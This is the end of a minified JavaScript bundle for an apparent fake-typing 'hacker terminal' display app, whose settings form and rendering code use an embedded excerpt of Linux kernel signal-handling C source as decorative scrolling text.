__ARCH_HAS_KA_RESTORER\n    new_ka.ka_restorer = NULL;\n#endif\n    new_ka.sa.sa_handler = compat_ptr(handler);\n    new_ka.sa.sa_restorer = compat_ptr(restorer);\n    siginitset(&new_ka.sa.sa_mask, mask);\n  }\n\n  ret = do_sigaction(sig, act ? &new_ka : NULL, oact ? &old_ka : NULL);\n\n  if (!ret && oact) {\n    if (!access_ok(oact, sizeof(*oact)) ||\n        __put_user(ptr_to_compat(old_ka.sa.sa_handler),\n             &oact->sa_handler) ||\n        __put_user(ptr_to_compat(old_ka.sa.sa_restorer),\n             &oact->sa_restorer) ||\n        __put_user(old_ka.sa.sa_flags, &oact->sa_flags) ||\n        __put_user(old_ka.sa.sa_mask.sig[0], &oact->sa_mask))\n      return -EFAULT;\n  }\n  return ret;\n}\n#endif\n\n#ifdef CONFIG_SGETMASK_SYSCALL\n\n\n\n\nSYSCALL_DEFINE0(sgetmask)\n{\n\n  return current->blocked.sig[0];\n}\n\nSYSCALL_DEFINE1(ssetmask, int, newmask)\n{\n  int old = current->blocked.sig[0];\n  sigset_t newset;\n\n  siginitset(&newset, newmask);\n  set_current_blocked(&newset);\n\n  return old;\n}\n#endif\n\n#ifdef __ARCH_WANT_SYS_SIGNAL\n\n\n\nSYSCALL_DEFINE2(signal, int, sig, __sighandler_t, handler)\n{\n  struct k_sigaction new_sa, old_sa;\n  int ret;\n\n  new_sa.sa.sa_handler = handler;\n  new_sa.sa.sa_flags = SA_ONESHOT | SA_NOMASK;\n  sigemptyset(&new_sa.sa.sa_mask);\n\n  ret = do_sigaction(sig, &new_sa, &old_sa);\n\n  return ret ? ret : (unsigned long)old_sa.sa.sa_handler;\n}\n#endif\n\n#ifdef __ARCH_WANT_SYS_PAUSE\n\nSYSCALL_DEFINE0(pause)\n{\n  while (!signal_pending(current)) {\n    __set_current_state(TASK_INTERRUPTIBLE);\n    schedule();\n  }\n  return -ERESTARTNOHAND;\n}\n\n#endif\n\nstatic int sigsuspend(sigset_t * set) {\n  current->saved_sigmask = current->blocked;\n  set_current_blocked(set);\n\n  while (!signal_pending(current)) {\n    __set_current_state(TASK_INTERRUPTIBLE);\n    schedule();\n  }\n  set_restore_sigmask();\n  return -ERESTARTNOHAND;\n}\n\nSYSCALL_DEFINE2(rt_sigsuspend, sigset_t\n__user *, unewset, size_t, sigsetsize)\n{\nsigset_t newset;\n\nif (sigsetsize != sizeof(sigset_t))\nreturn -\nEINVAL;\n\nif (\ncopy_from_user(&newset, unewset,\nsizeof(newset)))\nreturn -\nEFAULT;\nreturn\nsigsuspend(&newset);\n}\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE2(rt_sigsuspend, compat_sigset_t __user *, unewset, compat_s\n{\n  sigset_t newset;\n\n\n  if (sigsetsize != sizeof(sigset_t))\n    return -EINVAL;\n\n  if (get_compat_sigset(&newset, unewset))\n    return -EFAULT;\n  return sigsuspend(&newset);\n}\n#endif\n\n#ifdef CONFIG_OLD_SIGSUSPEND\nSYSCALL_DEFINE1(sigsuspend, old_sigset_t, mask)\n{\n  sigset_t blocked;\n  siginitset(&blocked, mask);\n  return sigsuspend(&blocked);\n}\n#endif\n#ifdef CONFIG_OLD_SIGSUSPEND3\nSYSCALL_DEFINE3(sigsuspend, int, unused1, int, unused2, old_sigset_t, mask)\n{\n  sigset_t blocked;\n  siginitset(&blocked, mask);\n  return sigsuspend(&blocked);\n}\n#endif\n\n__weak const char *arch_vma_name(struct vm_area_struct *vma) {\n  return NULL;\n}\n\nstatic inline void siginfo_buildtime_checks(void) {\n  BUILD_BUG_ON(sizeof(struct siginfo) != SI_MAX_SIZE);\n\n#define CHECK_OFFSET(field) \\\n  BUILD_BUG_ON(offsetof(siginfo_t, field) != offsetof(kernel_siginfo_t, field))\n\n  CHECK_OFFSET(si_pid);\n  CHECK_OFFSET(si_uid);\n\n  CHECK_OFFSET(si_tid);\n  CHECK_OFFSET(si_overrun);\n  CHECK_OFFSET(si_value);\n\n  CHECK_OFFSET(si_pid);\n  CHECK_OFFSET(si_uid);\n  CHECK_OFFSET(si_value);\n\n  CHECK_OFFSET(si_pid);\n  CHECK_OFFSET(si_uid);\n  CHECK_OFFSET(si_status);\n  CHECK_OFFSET(si_utime);\n  CHECK_OFFSET(si_stime);\n\n  CHECK_OFFSET(si_addr);\n  CHECK_OFFSET(si_trapno);\n  CHECK_OFFSET(si_addr_lsb);\n  CHECK_OFFSET(si_lower);\n  CHECK_OFFSET(si_upper);\n  CHECK_OFFSET(si_pkey);\n  CHECK_OFFSET(si_perf_data);\n  CHECK_OFFSET(si_perf_type);\n\n  CHECK_OFFSET(si_band);\n  CHECK_OFFSET(si_fd);\n\n  CHECK_OFFSET(si_call_addr);\n  CHECK_OFFSET(si_syscall);\n  CHECK_OFFSET(si_arch);\n#undef CHECK_OFFSET\n\n  BUILD_BUG_ON(offsetof(\n  struct siginfo, si_pid) !=\n  offsetof(\n  struct siginfo, si_addr));\n  if (sizeof(int) == sizeof(void __user *)) {\n    BUILD_BUG_ON(sizeof_field(\n    struct siginfo, si_pid) !=\n    sizeof(void\n    __user *));\n  } else {\n    BUILD_BUG_ON((sizeof_field(\n    struct siginfo, si_pid) +\n        sizeof_field(\n    struct siginfo, si_uid)) !=\n    sizeof(void\n    __user *));\n    BUILD_BUG_ON(offsetofend(\n    struct siginfo, si_pid) !=\n    offsetof(\n    struct siginfo, si_uid));\n  }\n#ifdef CONFIG_COMPAT\n  BUILD_BUG_ON(offsetof(struct compat_siginfo, si_pid) !=\n         offsetof(struct compat_siginfo, si_addr));\n  BUILD_BUG_ON(sizeof_field(struct compat_siginfo, si_pid) !=\n         sizeof(compat_uptr_t));\n  BUILD_BUG_ON(sizeof_field(struct compat_siginfo, si_pid) !=\n         sizeof_field(struct siginfo, si_pid));\n#endif\n}\n\nvoid __init\n\nsignals_init(void) {\n  siginfo_buildtime_checks();\n\n  sigqueue_cachep = KMEM_CACHE(sigqueue, SLAB_PANIC | SLAB_ACCOUNT);\n}\n\n#ifdef CONFIG_KGDB_KDB\n#include <linux/kdb.h>\n\n\n\n\n\n\nvoid kdb_send_sig(struct task_struct *t, int sig)\n{\n  static struct task_struct *kdb_prev_t;\n  int new_t, ret;\n  if (!spin_trylock(&t->sighand->siglock)) {\n    kdb_printf("Can\'t do kill command now.\\n"\n         "The sigmask lock is held somewhere else in "\n         "kernel, try again later\\n");\n    return;\n  }\n  new_t = kdb_prev_t != t;\n  kdb_prev_t = t;\n  if (!task_is_running(t) && new_t) {\n    spin_unlock(&t->sighand->siglock);\n    kdb_printf("Process is not RUNNING, sending a signal from "\n         "kdb risks deadlock\\n"\n         "on the run queue locks. "\n         "The signal has _not_ been sent.\\n"\n         "Reissue the kill command if you want to risk "\n         "the deadlock.\\n");\n    return;\n  }\n  ret = send_signal(sig, SEND_SIG_PRIV, t, PIDTYPE_PID);\n  spin_unlock(&t->sighand->siglock);\n  if (ret)\n    kdb_printf("Fail to deliver Signal %d to process %d.\\n",\n         sig, t->pid);\n  else\n    kdb_printf("Signal %d is sent to process %d.\\n", sig, t->pid);\n}\n#endif\n')},get dt(){return delete this.dt,this.dt=405}}]}}];var P=function(e){var t=l((0,n.useState)(e.settings),2),i=t[0],a=t[1],o=i.numTerminals,c=i.minAge,u=i.maxAge,d=i.interactive,f=i.fontForeground,p=i.fontBackground,_=function(n){var e=n.target,t=e.name,o="checkbox"===e.type?e.checked:e.value;"number"===e.type&&(o=+o,o=Math.max(o,0)),"minAge"!==t&&"maxAge"!==t||(o*=1e3);var l=s(s({},i),{},r({},t,o));a(l)};return(0,h.jsxs)("form",{onSubmit:function(n){n.preventDefault(),e.onSubmit(i)},className:"settings",children:[(0,h.jsxs)("div",{children:[(0,h.jsx)("label",{children:"Number of terminals"}),(0,h.jsx)("input",{type:"number",name:"numTerminals",value:o,onChange:_})]}),(0,h.jsxs)("div",{children:[(0,h.jsx)("label",{children:"Minimum seconds a terminal should run"}),(0,h.jsx)("input",{type:"number",name:"minAge",value:c/1e3,onChange:_})]}),(0,h.jsxs)("div",{children:[(0,h.jsx)("label",{children:"Maximum seconds a terminal should run"}),(0,h.jsx)("input",{type:"number",name:"maxAge",value:u/1e3,onChange:_})]}),(0,h.jsx)("div",{children:(0,h.jsxs)("span",{children:[(0,h.jsx)("input",{onChange:_,type:"color",name:"fontForeground",value:f}),(0,h.jsx)("label",{children:"Foreground"})]})}),(0,h.jsx)("div",{children:(0,h.jsxs)("span",{children:[(0,h.jsx)("input",{onChange:_,name:"fontBackground",value:p,type:"color"}),(0,h.jsx)("label",{children:"Background"})]})}),(0,h.jsx)("div",{children:(0,h.jsxs)("span",{children:[(0,h.jsx)("input",{type:"checkbox",name:"interactive",defaultChecked:d,onChange:_}),(0,h.jsx)("label",{children:"Interactive (Fake typing)"})]})}),(0,h.jsx)("button",{type:"submit",className:"settings-done",children:"DONE"})]})};var L=function(){var e=l((0,n.useState)(window.devicePixelRatio),2),t=e[0],r=e[1],i=l((0,n.useState)([]),2),a=i[0],o=i[1],c=(0,n.useRef)(0),u=(0,n.useRef)(new m),d=(0,n.useRef)(null),f=l((0,n.useState)(!1),2),p=f[0],_=f[1],g=l((0,n.useState)({numTerminals:4,minAge:2e3,maxAge:4e3,interactive:!1,fontBackground:"#000000",fontForeground:"#00ff00"}),2),k=g[0],b=g[1],y=(0,n.useRef)(null),S=(0,n.useCallback)((function(){var n,e,t,r=x(C),i=d.current.getBoundingClientRect(),s=i.width-24,a=i.height-50,o=u.current.getFontDimension(18,1),l=o.fontWidth,f=o.fontHeight,p=Math.max(5,Math.floor(a/f)),_=r.numCols*l,g=f*v(5,p),m=Math.max(0,v(0,a-g)),h=Math.max(0,v(0,s-_)),b=v(k.minAge,k.maxAge),y=Math.floor(b/100),S=c.current++,E=null!==(n=r.zIndex)&&void 0!==n?n:0,T=null!==(e=r.fontForeground)&&void 0!==e?e:k.fontForeground,I=null!==(t=r.fontBackground)&&void 0!==t?t:k.fontBackground;return{width:_,height:g,top:m,left:h,key:S,streams:r.streams,tickTime:100,maxNumTicks:y,titleColor:"#999",background:I,borderColor:"#666",fontSize:18,fontmap:u.current,id:S,zIndex:E,fontForeground:T,fontBackground:I}}),[k]);(0,n.useEffect)((function(){matchMedia("(resolution: ".concat(t,"dppx)")).addEventListener("change",(function(){return r(window.devicePixelRatio)}),{once:!0})}),[t]),(0,n.useEffect)((function(){var n="keydown",e=function(){y.current=Date.now()};return document.addEventListener(n,e),function(){return document.removeEventListener(n,e)}}),[]),(0,n.useEffect)((function(){for(var n=[],e=0;e<k.numTerminals;++e)n.push(S());o(n)}),[k,S]);var E=(0,n.useCallback)((function(){var n,e=Date.now()-(null!==(n=y.current)&&void 0!==n?n:0);return!1===p&&(!k.interactive||e<100)}),[p,k]),T=(0,n.useCallback)((function(n){o((function(e){return e.find((function(e){return e.key===n}))&&(e=e.filter((function(e){return e.key!==n}))).push(S()),e}))}),[S]);return(0,h.jsxs)("div",{className:"main",children:[(0,h.jsx)("div",{children:(0,h.jsx)("span",{className:"setting-button",onClick:function(){return _(!p)}})}),(0,h.jsxs)("div",{className:"main-content",ref:d,children:[p&&(0,h.jsx)(P,{settings:k,onSubmit:function(n){b(n),_(!1)}}),a.map((function(n){return(0,h.jsx)(N,s(s({},n),{},{scale:Math.ceil(t),shouldTick:E,quit:T}))}))]})]})};e.render((0,h.jsx)(n.StrictMode,{children:(0,h.jsx)(L,{})}),document.getElementById("root"))}()}();
//# sourceMappingURL=main.d349dc9c.js.map